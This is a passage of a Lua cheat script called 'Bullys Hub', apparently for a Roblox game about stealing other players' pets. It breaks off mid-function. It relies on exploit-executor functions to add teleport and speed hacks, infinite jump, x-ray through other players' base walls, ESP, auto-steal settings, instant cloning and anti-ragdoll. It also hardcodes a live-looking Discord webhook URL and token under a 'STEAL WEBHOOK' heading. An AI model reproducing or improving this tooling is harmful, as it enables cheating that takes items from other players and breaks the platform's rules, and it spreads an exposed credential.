-- ══════════════════════════════════════════════════════════════════════════
-- ▸ BULLYS HUB - VERSÃO OTIMIZADA E RÁPIDA ◂
-- ══════════════════════════════════════════════════════════════════════════

-- 🔔 STEAL WEBHOOK · Edite as duas linhas abaixo
-- ─────────────────────────────────────────────────────────────────────────
local WEBHOOK_URL = "https://discord.com/api/webhooks/1486223547759198270/CxqmbTvEepoQK8sNqUDS3j2K0aY5kbv_fzEKd4IC9b9owZXwyXPIlwegbaJzvnF4FS5l"
local DISCORD_ID  = "SEU_ID_AQUI"        -- Cole seu ID do Discord (ex: "123456789012345678")

-- [HWID DESATIVADO]

-- ══════════════════════════════════════════════════════════════════════════
-- ▸ BULLYS HUB - CÓDIGO OTIMIZADO ◂
-- ══════════════════════════════════════════════════════════════════════════

if not game:IsLoaded() then game.Loaded:Wait() end

pcall(function() game:GetService("Players").RespawnTime = 0 end)

pcall(function() if setfpscap then setfpscap(9999) end end)

local SharedState = {   

    ConveyorAnimals = {},

    BestConveyorGv = -1,

    SelectedPetData = nil,

    AllAnimalsCache = nil,

    ListNeedsRedraw = true,

    AdminButtonCache = {},

    BalloonedPlayers = {},

    PetPreviewModelCache = {},

    MobileScaleObjects = {},

}

local Services = {

    Players = game:GetService("Players"),

    RunService = game:GetService("RunService"),

    UserInputService = game:GetService("UserInputService"),

    ReplicatedStorage = game:GetService("ReplicatedStorage"),

    TweenService = game:GetService("TweenService"),

    HttpService = game:GetService("HttpService"),

    Workspace = game:GetService("Workspace"),

    Lighting = game:GetService("Lighting"),

    VirtualInputManager = game:GetService("VirtualInputManager"),

    GuiService = game:GetService("GuiService"),

    TeleportService = game:GetService("TeleportService"),

}

local Players = Services.Players

local RunService = Services.RunService

local UserInputService = Services.UserInputService

local ReplicatedStorage = Services.ReplicatedStorage

local TweenService = Services.TweenService

local HttpService = Services.HttpService

local Workspace = Services.Workspace

local Lighting = Services.Lighting

local VirtualInputManager = Services.VirtualInputManager

local GuiService = Services.GuiService

local TeleportService = Services.TeleportService

local LocalPlayer = Players.LocalPlayer

local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local Decrypted

Decrypted = setmetatable({}, {

    __index = function(S, ez)

        local Netty = ReplicatedStorage.Packages.Net

        local prefix, path

        if     ez:sub(1,3) == "RE/" then prefix = "RE/";  path = ez:sub(4)

        elseif ez:sub(1,3) == "RF/" then prefix = "RF/";  path = ez:sub(4)

        else return nil end

        local Remote

        for i, v in Netty:GetChildren() do

            if v.Name == ez then

                Remote = Netty:GetChildren()[i + 1]

                break

            end

        end

        if Remote and not rawget(Decrypted, ez) then rawset(Decrypted, ez, Remote) end

        return rawget(Decrypted, ez)

    end

})

local Utility = {}

function Utility:LarpNet(F) return Decrypted[F] end

-- Safe conversion for configurable keybind strings.

local function safeKeyCode(name, fallback)

    if type(name) ~= "string" then return fallback end

    local cleaned = name:gsub("^%s+", ""):gsub("%s+$", "")

    if cleaned == "" or cleaned == "--" then return fallback end

    local ok, kc = pcall(function() return Enum.KeyCode[cleaned] end)

    if ok and kc then return kc end

    return fallback

end

local FileName = "bullysprivV10.json" 

local DefaultConfig = {

    Positions = {

        AdminPanel = {X = 0.1859375, Y = 0.5767123526556385}, 

        AdminToolsPanel = {X = 0.02, Y = 0.25},

        Settings = {X = 0.834375, Y = 0.43590998043052839},

        AutoSteal = {X = 0.02, Y = 0.35}, 

        JobJoiner = {X = 0.5, Y = 0.85},

        }, 

    TpSettings = {

        Tool           = "Flying Carpet",

        Speed          = 2,

        TpKey          = "T",

        CloneKey       = "V",

        TpOnLoad       = false,

        MinGenForTp    = "",

        CarpetSpeedKey = "Q",

        InfiniteJump   = false,

        TpDelay        = 0,    -- delay antes de iniciar o TP (s)

        TpAfterFps     = false, -- só executa TP quando FPS >= threshold

        FpsThreshold   = 200,  -- FPS alvo pra TpAfterFps

        FpsWait        = 0,    -- wait adicional depois de atingir FPS (s)

        TpMode         = "Side", -- "Side" / "2Sides" / "Front"

        PerBaseTpMode  = {       -- override por base (1-8); "Default" = usa TpMode global
            ["1"] = "Default", ["2"] = "Default", ["3"] = "Default", ["4"] = "Default",
            ["5"] = "Default", ["6"] = "Default", ["7"] = "Default", ["8"] = "Default",
        },

    },

    SellAlertOn  = true,

    SellSoundId  = "5676756526",

    SellVolume   = 3,

    MenuKey      = "LeftControl",

    XrayEnabled  = true,

    AntiRagdoll  = 0,

    AntiRagdollV2 = true,

    PlayerESP    = true,

    FPSBoost     = true,

    BrainrotESP = true,

    LineToBase = false,

    StealNearest = false,

    MinimumNearest = "",

    StealHighest = true,

    StealPriority = false,

    DefaultToNearest = false,

    DefaultToHighest = false,

    DefaultToPriority = false,

    AutoBack = false,

    ShowStealingHUD = true,

    ShowStealingPlotESP = true,

    ConveyorESP = false,

    PriorityList = {},

    DefaultToDisable = false,

    UILocked     = false,

    HideAdminPanel = false,

    ShowAdminToolsPanel = true,

    HideAutoSteal = false,

    DesyncEnabled = true,

    ServerPosVisualizerEnabled = false,

    AutoKickOnSteal = false,

    InstantSteal = false,

    AutoRecoverLagback = true,

    ClickToAP = false,

    ClickToAPKeybind = "L",

    ProximityAP = false,

    ProximityAPKeybind = "P",

    ProximityRange = 15,

    ResetKey = "X",

    AntiBeeDisco = false,

    FOV = 70,

    SubspaceMineESP = false,

    IncomingSlotESP = true,

    AutoUnlockOnSteal = false,

    ShowUnlockButtonsHUD = true,

    AutoTPPriority = true,

    KickKey = "",

    CleanErrorGUIs = false,

    ClickToAPSingleCommand = false,

    RagdollSelfKey = "",

    AlertsEnabled = true,

    AlertSoundID = "rbxassetid://6518811702",

    SelectSoundEnabled = true,

    SelectSoundId      = "3779096010",

    SelectSoundVolume  = 1,

    AntiSwapEnabled = true,

    AntiSwapThreshold = 20,    -- studs de diff pra considerar swap

    AntiSwapWindow    = 0.25,  -- janela máxima entre amostras (s)

    AntiSwapCooldown  = 0.5,   -- cooldown mínimo entre ativações (s)

    AntiSwapRange     = 100,

    SelectedSellSlot  = 1,

    ShowJobJoiner = true,

    JobJoinerKey = "J",

    CurrentTheme = "preto",

    ShowMiniActions = true,

    AutoHideMiniUI = false,

    MiniUIPos = {X = 0.01, Y = 0.35},

    MiniUILocked = false,

    Blacklist = {},

    BlacklistESP = true,

    BlacklistMsg = "BLOCKED",

    AutoBuyEnabled = false,

    AutoBuyKey = "K",

    AutoBuyRange = 20,

    HideStatusHUD = false,

    AutoPickupKey = "B",

    AutoPickupActive = false,

    AutoPickupKick = false,

}

local Config = DefaultConfig

if isfile and isfile(FileName) then

    pcall(function()

        local ok, decoded = pcall(function() return HttpService:JSONDecode(readfile(FileName)) end)

        if not ok then return end

        for k, v in pairs(DefaultConfig) do

            if decoded[k] == nil then decoded[k] = v end

        end

        if decoded.TpSettings then

            for k, v in pairs(DefaultConfig.TpSettings) do

                if decoded.TpSettings[k] == nil then decoded.TpSettings[k] = v end

            end

        end

        if decoded.Positions then

            for k, v in pairs(DefaultConfig.Positions) do

                if decoded.Positions[k] == nil then decoded.Positions[k] = v end

            end

        end

        if type(decoded.Blacklist) ~= "table" then decoded.Blacklist = {} end

        Config = decoded

    end)

end

Config.ProximityAP = false
Config.AutoPickupActive = false  -- sempre desativado ao iniciar

if Config.CurrentTheme and THEMES and THEMES[Config.CurrentTheme] then

    for k, v in pairs(THEMES[Config.CurrentTheme]) do Theme[k] = v end

end

local function SaveConfig()

    if writefile then

        pcall(function()

            local toSave = {}

            for k, v in pairs(Config) do toSave[k] = v end

            toSave.ProximityAP = false

            writefile(FileName, HttpService:JSONEncode(toSave))

        end)

    end

end

_G.RecoveryInProgress = false

local function getControls()

	local playerScripts = LocalPlayer:WaitForChild("PlayerScripts")

	local playerModule = require(playerScripts:WaitForChild("PlayerModule"))

	return playerModule:GetControls()

end

local Controls = getControls()

local function kickPlayer()

    local ok = pcall(function()

        if game.Shutdown then

            game:Shutdown()

        else

            LocalPlayer:Kick("\nBULLYS HUB")

        end

    end)

    if not ok then

        pcall(function() LocalPlayer:Kick("\nBULLYS HUB") end)

    end

end

local function walkForward(seconds)

    local char = LocalPlayer.Character

    local hum = char:FindFirstChild("Humanoid")

    local hrp = char:FindFirstChild("HumanoidRootPart")

    local Controls = getControls()

    local lookVector = hrp.CFrame.LookVector

    Controls:Disable()

    local startTime = os.clock()

    local conn

    conn = RunService.Heartbeat:Connect(function()

        if os.clock() - startTime >= seconds then

            conn:Disconnect()

            hum:Move(Vector3.zero, false)

            Controls:Enable()

            return

        end

        hum:Move(lookVector, false)

    end)

end

-- ── Clone Cooldown Detection (via CooldownTime do Quantum Cloner) ──
local function isCloneOnCooldown()
    local char = LocalPlayer.Character
    local cloner = LocalPlayer.Backpack:FindFirstChild("Quantum Cloner")
        or (char and char:FindFirstChild("Quantum Cloner"))
    if not cloner then return true end
    local cdTime = cloner:GetAttribute("CooldownTime")
    if not cdTime then return false end
    return os.clock() < cdTime
end

local function instantClone()

    if _G.isCloning then return end

    _G.isCloning = true

    local ok, err = pcall(function()

        local char = LocalPlayer.Character

        local hum = char and char:FindFirstChildOfClass("Humanoid")

        if not (char and hum) then error("No character") end

        local cloner =

            LocalPlayer.Backpack:FindFirstChild("Quantum Cloner")

            or char:FindFirstChild("Quantum Cloner")

        if not cloner then error("No Quantum Cloner") end

        pcall(function()

            hum:EquipTool(cloner)

        end)

        task.wait(0.03)

        cloner:Activate()

        task.wait(0.03)

        local cloneName = tostring(LocalPlayer.UserId) .. "_Clone"

        for _ = 1, 100 do

            if Workspace:FindFirstChild(cloneName) then break end

            task.wait(0.05)

        end

        if not Workspace:FindFirstChild(cloneName) then

            error("")

        end

        local toolsFrames = LocalPlayer.PlayerGui:FindFirstChild("ToolsFrames")

        local qcFrame = toolsFrames and toolsFrames:FindFirstChild("QuantumCloner")

        local tpButton = qcFrame and qcFrame:FindFirstChild("TeleportToClone")

        if not tpButton then error("Teleport button missing") end

        tpButton.Visible = true

        if firesignal then

            firesignal(tpButton.MouseButton1Up)

        else

            local vim = cloneref and cloneref(game:GetService("VirtualInputManager")) or VirtualInputManager

            local inset = (cloneref and cloneref(game:GetService("GuiService")) or GuiService):GetGuiInset()

            local pos = tpButton.AbsolutePosition + (tpButton.AbsoluteSize / 2) + inset

            vim:SendMouseButtonEvent(pos.X, pos.Y, 0, true, game, 1)

            task.wait()

            vim:SendMouseButtonEvent(pos.X, pos.Y, 0, false, game, 1)

        end

    end)

    _G.isCloning = false

end

local function triggerClosestUnlock(yLevel, maxY)

    local character = LocalPlayer.Character

    local hrp = character and character:FindFirstChild("HumanoidRootPart")

    if not hrp then return end

    local playerY = yLevel or hrp.Position.Y

    local Y_THRESHOLD = 5

    local bestPromptSameLevel = nil

    local shortestDistSameLevel = math.huge

    local bestPromptFallback = nil

    local shortestDistFallback = math.huge

    

    local plots = Workspace:FindFirstChild("Plots")

    if not plots then return end

    for _, obj in ipairs(plots:GetDescendants()) do

        if obj:IsA("ProximityPrompt") and obj.Enabled then

            local part = obj.Parent

            if part and part:IsA("BasePart") then

                if maxY and part.Position.Y > maxY then

                else

                    local distance = (hrp.Position - part.Position).Magnitude

                    local yDifference = math.abs(playerY - part.Position.Y)

                    if distance < shortestDistFallback then

                        shortestDistFallback = distance

                        bestPromptFallback = obj

                    end

                    if yDifference <= Y_THRESHOLD then

                        if distance < shortestDistSameLevel then

                            shortestDistSameLevel = distance

                            bestPromptSameLevel = obj

                        end

                    end

                end

            end

        end

    end

    local targetPrompt = bestPromptSameLevel or bestPromptFallback

    if targetPrompt then

        if fireproximityprompt then

            fireproximityprompt(targetPrompt)

        else

            targetPrompt:InputBegan(Enum.UserInputType.MouseButton1)

            task.wait(0.05)

            targetPrompt:InputEnded(Enum.UserInputType.MouseButton1)

        end

    end

end

local Theme = {

    Background      = Color3.fromRGB(10, 10, 10),

    Surface         = Color3.fromRGB(20, 20, 20),

    SurfaceHighlight= Color3.fromRGB(32, 32, 32),

    Accent1         = Color3.fromRGB(170, 170, 170),

    Accent2         = Color3.fromRGB(125, 125, 125),

    TextPrimary     = Color3.fromRGB(240, 240, 240),

    TextSecondary   = Color3.fromRGB(185, 185, 185),

    Success         = Color3.fromRGB(170, 170, 170),

    Error           = Color3.fromRGB(210, 90, 90),

}

THEMES = {

    preto = {

        Background       = Color3.fromRGB(10, 10, 10),

        Surface          = Color3.fromRGB(20, 20, 20),

        SurfaceHighlight = Color3.fromRGB(32, 32, 32),

        Accent1          = Color3.fromRGB(170, 170, 170),

        Accent2          = Color3.fromRGB(125, 125, 125),

        TextPrimary      = Color3.fromRGB(240, 240, 240),

        TextSecondary    = Color3.fromRGB(185, 185, 185),

        Success          = Color3.fromRGB(170, 170, 170),

        Error            = Color3.fromRGB(210, 90, 90),

        GlowColor1       = Color3.fromRGB(170, 170, 170),

        GlowColor2       = Color3.fromRGB(125, 125, 125),

    },

}

function applyTheme(themeName)

    local t = THEMES[themeName]

    if not t then return end

    local colorMap = {}

    for k, oldColor in pairs(Theme) do

        if t[k] then

            colorMap[oldColor] = t[k]

        end

    end

    for k, v in pairs(t) do

        Theme[k] = v

    end

    Config.CurrentTheme = themeName

    SaveConfig()

    local function matchColor(c1, c2)

        if not c1 or not c2 then return false end

        local dr = math.abs(c1.R - c2.R)

        local dg = math.abs(c1.G - c2.G)

        local db = math.abs(c1.B - c2.B)

        return (dr + dg + db) < 0.04

    end

    local function remapColor(c)

        if not c then return c end

        for oldC, newC in pairs(colorMap) do

            if matchColor(c, oldC) then return newC end

        end

        return c

    end

    local guiNames = {

        "AutoStealUI", "XiAdminPanel", "SettingsUI",

        "BullysStatusHUD", "BullysNotif",

        "BullysThemeUI", "PriorityListGUI", "BullysJobJoiner", "BullysPriorityAlert",

        "BullysSettings"

    }

    for _, guiName in ipairs(guiNames) do

        local sg = PlayerGui:FindFirstChild(guiName)

        if sg then

            for _, obj in ipairs(sg:GetDescendants()) do

                pcall(function()

                    if obj:IsA("Frame") or obj:IsA("TextButton") or

                       obj:IsA("TextBox") or obj:IsA("ScrollingFrame") or

                       obj:IsA("ImageLabel") then

                        if obj.BackgroundTransparency < 1 then

                            obj.BackgroundColor3 = remapColor(obj.BackgroundColor3)

                        end

                    end

                    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then

                        obj.TextColor3 = remapColor(obj.TextColor3)

                    end

                    if obj:IsA("UIStroke") then

                        obj.Color = remapColor(obj.Color)

                    end

                    if obj:IsA("ScrollingFrame") then

                        obj.ScrollBarImageColor3 = remapColor(obj.ScrollBarImageColor3)

                    end

                    if obj:IsA("UIGradient") then

                        local kps = obj.Color.Keypoints

                        local changed = false

                        local newKps = {}

                        for _, kp in ipairs(kps) do

                            local nc = remapColor(kp.Value)

                            if nc ~= kp.Value then changed = true end

                            table.insert(newKps, ColorSequenceKeypoint.new(kp.Time, nc))

                        end

                        if changed then

                            obj.Color = ColorSequence.new(newKps)

                        end

                    end

                    if obj:IsA("Beam") then

                        local kps = obj.Color.Keypoints

                        local newKps = {}

                        for _, kp in ipairs(kps) do

                            table.insert(newKps, ColorSequenceKeypoint.new(kp.Time, remapColor(kp.Value)))

                        end

                        obj.Color = ColorSequence.new(newKps)

                    end

                end)

            end

            pcall(function()

                local root = sg:FindFirstChildWhichIsA("Frame")

                if root and root.BackgroundTransparency < 1 then

                    root.BackgroundColor3 = remapColor(root.BackgroundColor3)

                end

            end)

        end

    end

    task.spawn(function()

        local savedTab  = (_G.BullysSettingsUI and _G.BullysSettingsUI.currentTab) or "cfg"

        local wasVis    = _G.BullysSettingsUI and _G.BullysSettingsUI.panel and _G.BullysSettingsUI.panel.Visible

        if buildBullysSettingsUI then

            buildBullysSettingsUI()

        end

        task.wait()

        if _G.BullysSettingsUI then

            if _G.BullysSettingsUI.switchTab then

                _G.BullysSettingsUI.switchTab(savedTab)

            end

            if wasVis and _G.BullysSettingsUI.panel then

                _G.BullysSettingsUI.panel.Visible = true

            end

        end

        if _G.rebuildStatusHUD then

            _G.rebuildStatusHUD()

        end

        if _G.updateAutoBuyRingColor then _G.updateAutoBuyRingColor() end

        if _G.rebuildAutoBuyCirclePresets then _G.rebuildAutoBuyCirclePresets() end

        if buildMiniActionsUI then

            local miniWasVis = _G.MiniActionsUI and _G.MiniActionsUI.panel and _G.MiniActionsUI.panel.Visible

            buildMiniActionsUI()

            task.wait()

            if miniWasVis and _G.MiniActionsUI and _G.MiniActionsUI.panel then

                _G.MiniActionsUI.panel.Visible = true

            end

        end

    end)

    if ShowNotification then

    ShowNotification("TEMA", "Tema " .. themeName .. " aplicado!")

end

end

local PRIORITY_LIST = {

  "Headless Horseman","Strawberry Elephant","Meowl","Signore Carapace","Skibidi Toilet","Griffin","Love Love Bear","Dragon Gingerini","Elefanto Frigo","Ginger Gerat","La Supreme Combinasion","Antonio","Dragon Cannelloni","Hydra Dragon Cannelloni","Dug dug dug","Ketupat Bros","Tirilikalika Tirilikalako","La Casa Boo","Los Amigos","Cerberus","Celestial Pegasus","Cooki and Milki","Rosey and Teddy","Reinito Sleighito","Capitano Moby","Spooky and Pumpky","Fragrama and Chocrama","Garama and Madundung","La Food Combinasion","Burguro and Fryuro","Popcuru and Fizzuru","Ketchuru and Musturu","La Secret Combinasion","Tralaledon","Tictac Sahur","Ketupat Kepat","Tang Tang Keletang","Orcaledon","La Ginger Sekolah","Los Spaghettis","Lavadorito Spinito","Swaggy Bros","La Taco Combinasion","Los Primos","Chillin Chili","Tuff Toucan","W or L","Chillin Chili","Chipso and Queso","Fishino Clownino"

}

do

    local saved = Config and Config.PriorityList

    if saved and type(saved) == "table" and #saved > 0 then

        PRIORITY_LIST = saved

    end

end

local function savePriorityToConfig()

    Config.PriorityList = {}

    for i, v in ipairs(PRIORITY_LIST) do Config.PriorityList[i] = v end

    SaveConfig()

end

local function findAdorneeGlobal(animalData)

    if not animalData then return nil end

    local plot = Workspace:FindFirstChild("Plots") and Workspace.Plots:FindFirstChild(animalData.plot)

    if plot then

        local podiums = plot:FindFirstChild("AnimalPodiums")

        if podiums then

            local podium = podiums:FindFirstChild(animalData.slot)

            if podium then

                local base = podium:FindFirstChild("Base")

                if base then

                    local spawn = base:FindFirstChild("Spawn")

                    if spawn then return spawn end

                    return base:FindFirstChildWhichIsA("BasePart") or base

                end

            end

        end

    end

    return nil

end

local function MakeDraggable(handle, target, saveKey)

    local dragging, dragInput, dragStart, startPos

    handle.InputBegan:Connect(function(input)

        if Config.UILocked then return end

        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then

            dragging = true

            dragStart = input.Position

            startPos = target.Position

            

            input.Changed:Connect(function()

                if input.UserInputState == Enum.UserInputState.End then

                    dragging = false

                    if saveKey then

                        local parentSize = target.Parent.AbsoluteSize

                        Config.Positions[saveKey] = {

                            X = target.AbsolutePosition.X / parentSize.X,

                            Y = target.AbsolutePosition.Y / parentSize.Y,

                        }

                        SaveConfig()

                    end

                end

            end)

        end

    end)

    handle.InputChanged:Connect(function(input)

        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then

            dragInput = input

        end

    end)

    UserInputService.InputChanged:Connect(function(input)

        if input == dragInput and dragging then

            local delta = input.Position - dragStart

            target.Position = UDim2.new(

                startPos.X.Scale, startPos.X.Offset + delta.X,

                startPos.Y.Scale, startPos.Y.Offset + delta.Y

            )

        end

    end)

end

local DANGER_TOOLS = {

    ["Boogie Bomb"] = true,

    ["Medusa's Head"] = true,

    ["Body Swap Potion"] = true,

    ["Laser Cape"] = true,

    ["Rainbowrath Sword"] = true,

    ["Gummy Bear"] = true,

}

local function isMobileDevice()

    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled

end

local IS_MOBILE = isMobileDevice()

local function ApplyViewportUIScaleAdmin(targetFrame, _, _, minScale, maxScale)

    if not targetFrame or not IS_MOBILE then return end

    local existing = targetFrame:FindFirstChildOfClass("UIScale")

    if existing then existing:Destroy() end

    local sc = Instance.new("UIScale")

    sc.Parent = targetFrame

    sc.Scale = math.clamp(0.65, minScale or 0.45, maxScale or 0.85)

end

local function AddMobileMinimizeAdmin(frame, labelText)

    if not IS_MOBILE or not frame then return end

    local header = frame:FindFirstChildWhichIsA("Frame")

    if not header then return end

    local minimizeBtn = Instance.new("TextButton")

    minimizeBtn.Size = UDim2.new(0, 26, 0, 26)

    minimizeBtn.Position = UDim2.new(1, -30, 0, 6)

    minimizeBtn.BackgroundColor3 = Color3.fromRGB(22,22,35)

    minimizeBtn.Text = "-"

    minimizeBtn.Font = Enum.Font.GothamBlack

    minimizeBtn.TextSize = 18

    minimizeBtn.TextColor3 = Color3.fromRGB(185,188,215)

    minimizeBtn.AutoButtonColor = false

    minimizeBtn.Parent = header

    Instance.new("UICorner", minimizeBtn).CornerRadius = UDim.new(0, 8)

    local guiParent = frame.Parent

    local restoreBtn = Instance.new("TextButton")

    restoreBtn.Size = UDim2.new(0, 110, 0, 34)

    restoreBtn.Position = UDim2.new(0, 10, 1, -44)

    restoreBtn.BackgroundColor3 = Color3.fromRGB(22,22,35)

    restoreBtn.Text = labelText or "OPEN"

    restoreBtn.Font = Enum.Font.GothamBold

    restoreBtn.TextSize = 12

    restoreBtn.TextColor3 = Color3.fromRGB(185,188,215)

    restoreBtn.Visible = false

    restoreBtn.AutoButtonColor = false

    restoreBtn.Parent = guiParent

    Instance.new("UICorner", restoreBtn).CornerRadius = UDim.new(0, 7)

    MakeDraggable(restoreBtn, restoreBtn)

    minimizeBtn.MouseButton1Click:Connect(function()

        frame.Visible = false

        restoreBtn.Visible = true

    end)

    restoreBtn.MouseButton1Click:Connect(function()

        frame.Visible = true

        restoreBtn.Visible = false

    end)

end

local function ShowNotification(title, text) end

local function isPlayerCharacter(model)

    return Players:GetPlayerFromCharacter(model) ~= nil

end

local function handleAnimator(animator)

    local model = animator:FindFirstAncestorOfClass("Model")

    if model and isPlayerCharacter(model) then return end

    for _, track in pairs(animator:GetPlayingAnimationTracks()) do track:Stop(0) end

    animator.AnimationPlayed:Connect(function(track) track:Stop(0) end)

end

local function stripVisuals(obj)

    local model = obj:FindFirstAncestorOfClass("Model")

    local isPlayer = model and isPlayerCharacter(model)

    if obj:IsA("Animator") then handleAnimator(obj) end

    if obj:IsA("Accessory") or obj:IsA("Clothing") then

        if obj:FindFirstAncestorOfClass("Model") then

            obj:Destroy()

        end

    end

    if not isPlayer then

        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or 

           obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") or 

           obj:IsA("Highlight") then

            obj.Enabled = false

        end

        if obj:IsA("Explosion") then

            obj:Destroy()

        end

        if obj:IsA("MeshPart") then

            obj.TextureID = ""

        end

    end

    if obj:IsA("BasePart") then

        obj.Material = Enum.Material.Plastic

        obj.Reflectance = 0

        obj.CastShadow = false

    end

    if obj:IsA("SurfaceAppearance") or obj:IsA("Texture") or obj:IsA("Decal") then

        obj:Destroy()

    end

end

local fpsBoostState = {

    enabled = false,

    original = nil,

    effectStates = {},

    atmosphereStates = {},

    descendantConn = nil,

}

-- ── FPS Boost · Lógica V1 importada EXATAMENTE do hub Logística ──
-- Trava o tempo em 7am (DayLock) + ambient escuro (20,20,20) + brightness 2
-- Destrói Bloom/Blur/SunRays/ColorCorrection/DepthOfField, zera água do terrain
local function setFPSBoost(enabled)
    Config.FPSBoost = enabled
    SaveConfig()

    if fpsBoostState.descendantConn then
        fpsBoostState.descendantConn:Disconnect()
        fpsBoostState.descendantConn = nil
    end

    getgenv().DayLock = getgenv().DayLock or {}
    getgenv().DayLock.Hour = 7
    getgenv().DayLock.Refresh = 0.1
    getgenv().DayLock.Enabled = enabled and true or false

    if enabled then
        Lighting.ClockTime = getgenv().DayLock.Hour
        Lighting.TimeOfDay = string.format("%02d:00:00", getgenv().DayLock.Hour)
        task.spawn(function()
            local objs = Workspace:GetDescendants()
            local batchSize = 30 -- cantidad por frame
            for i = 1, #objs do
                stripVisuals(objs[i])
                if i % batchSize == 0 then
                    task.wait() -- deja respirar al frame
                end
            end
        end)

        fpsBoostState.descendantConn = Workspace.DescendantAdded:Connect(function(obj)
            if not Config.FPSBoost then return end
            task.defer(function()
                stripVisuals(obj)
            end)
        end)

        -- FPS BOOST + BAJAR ILUMINACION
        local Terrain = Workspace:FindFirstChildOfClass("Terrain")

        pcall(function()
            Lighting.Brightness = 2
            Lighting.GlobalShadows = false
            Lighting.OutdoorAmbient = Color3.fromRGB(165,165,165)
            Lighting.Ambient = Color3.fromRGB(20,20,20)

            Lighting.FogEnd = 9e9
            Lighting.FogStart = 0
            Lighting.EnvironmentDiffuseScale = 0
            Lighting.EnvironmentSpecularScale = 0

            for _,v in pairs(Lighting:GetChildren()) do
                if v:IsA("BlurEffect")
                or v:IsA("SunRaysEffect")
                or v:IsA("BloomEffect")
                or v:IsA("ColorCorrectionEffect")
                or v:IsA("DepthOfFieldEffect") then
                    v:Destroy()
                end
            end

            if Terrain then
                Terrain.WaterWaveSize = 0
                Terrain.WaterWaveSpeed = 0
                Terrain.WaterReflectance = 0
                Terrain.WaterTransparency = 1
            end
        end)

        fpsBoostState.enabled = true
    else
        fpsBoostState.enabled = false
    end
end

if Config.FPSBoost then task.spawn(function() task.wait(1); setFPSBoost(true) end) end

local State = {

    ProximityAPActive = false,

    carpetSpeedEnabled = false,

    infiniteJumpEnabled = Config.TpSettings.InfiniteJump,

    xrayEnabled = false,

    antiRagdollMode = Config.AntiRagdoll or 0,

    isTpMoving = false,
    stealJustCompleted = false,
    lastStealTargetUID = nil,
    lastStealingTrueTime = 0,

    manualTargetEnabled = false,

}

_G.BullysState = State

local Connections = {

    carpetSpeedConnection = nil,

    infiniteJumpConnection = nil,

    _ijInputBegan = nil,

    _ijInputEnded = nil,

    xrayDescConn = nil,

    antiRagdollConn = nil,

    antiRagdollV2Task = nil,

}

local UI = {

    carpetStatusLabel = nil,

    settingsGui = nil,

}

local carpetSpeedEnabled = State.carpetSpeedEnabled

local carpetSpeedConnection = Connections.carpetSpeedConnection

local _carpetStatusLabel = UI.carpetStatusLabel

local function setCarpetSpeed(enabled)
    State.carpetSpeedEnabled = enabled
    carpetSpeedEnabled = State.carpetSpeedEnabled
    if Connections.carpetSpeedConnection then Connections.carpetSpeedConnection:Disconnect(); Connections.carpetSpeedConnection = nil end
    carpetSpeedConnection = Connections.carpetSpeedConnection
    if not enabled then return end

    Connections.carpetSpeedConnection = RunService.Heartbeat:Connect(function()
    carpetSpeedConnection = Connections.carpetSpeedConnection
        local c = LocalPlayer.Character
        if not c then return end
        local hum = c:FindFirstChild("Humanoid")
        local hrp = c:FindFirstChild("HumanoidRootPart")
        if not hum or not hrp then return end

        local toolName = Config.TpSettings.Tool
        local hasTool = c:FindFirstChild(toolName)
        
        if not hasTool then
            local tb = LocalPlayer.Backpack:FindFirstChild(toolName)
            if tb then hum:EquipTool(tb) end
        end

        if hasTool then
            local md = hum.MoveDirection
            if md.Magnitude > 0 then
                hrp.AssemblyLinearVelocity = Vector3.new(
                    md.X * 140, 
                    hrp.AssemblyLinearVelocity.Y, 
                    md.Z * 140
                )
            else
                hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
            end
        end
    end)
end
local infiniteJumpEnabled = State.infiniteJumpEnabled

local infiniteJumpConnection = Connections.infiniteJumpConnection

local function setInfiniteJump(enabled)
    State.infiniteJumpEnabled = enabled
    infiniteJumpEnabled = State.infiniteJumpEnabled
    Config.TpSettings.InfiniteJump = enabled
    SaveConfig()
    if Connections.infiniteJumpConnection then Connections.infiniteJumpConnection:Disconnect(); Connections.infiniteJumpConnection = nil end
    if Connections._ijInputBegan then Connections._ijInputBegan:Disconnect(); Connections._ijInputBegan = nil end
    if Connections._ijInputEnded then Connections._ijInputEnded:Disconnect(); Connections._ijInputEnded = nil end
    infiniteJumpConnection = Connections.infiniteJumpConnection
    if not enabled then return end

    local isSpaceHeld = false
    local inputBegan = UserInputService.InputBegan:Connect(function(input, gp)
        if gp then return end
        if input.KeyCode == Enum.KeyCode.Space then isSpaceHeld = true end
    end)
    local inputEnded = UserInputService.InputEnded:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.Space then isSpaceHeld = false end
    end)
    Connections.infiniteJumpConnection = RunService.RenderStepped:Connect(function()
    infiniteJumpConnection = Connections.infiniteJumpConnection
        if not isSpaceHeld then return end
        local char = LocalPlayer.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChild("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then return end
        hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 50, hrp.AssemblyLinearVelocity.Z)
    end)
    Connections._ijInputBegan = inputBegan
    Connections._ijInputEnded = inputEnded
end
if infiniteJumpEnabled then setInfiniteJump(true) end

local XrayState = {

    originalTransparency = {},

    xrayEnabled = false,

}

local originalTransparency = XrayState.originalTransparency

local xrayEnabled = XrayState.xrayEnabled

-- ── X-Ray · Lógica importada EXATAMENTE do hub Logística ──
-- Detecta BasePart/MeshPart/UnionOperation, procura "base" OU "claim" no nome ou parent
-- Usa transparência 0.7 e ativa Invisicam pra fix de camera
local function isBaseWall(obj)
    if not (obj:IsA("BasePart") or obj:IsA("MeshPart") or obj:IsA("UnionOperation")) then
        return false
    end

    local name = obj.Name:lower()
    local parentName = (obj.Parent and obj.Parent.Name:lower()) or ""

    return name:find("base") or name:find("claim") or parentName:find("base") or parentName:find("claim")
end

local function applyBaseWallhack(obj)
    if not XrayState.xrayEnabled then return end
    if isBaseWall(obj) then
        if XrayState.originalTransparency[obj] == nil then
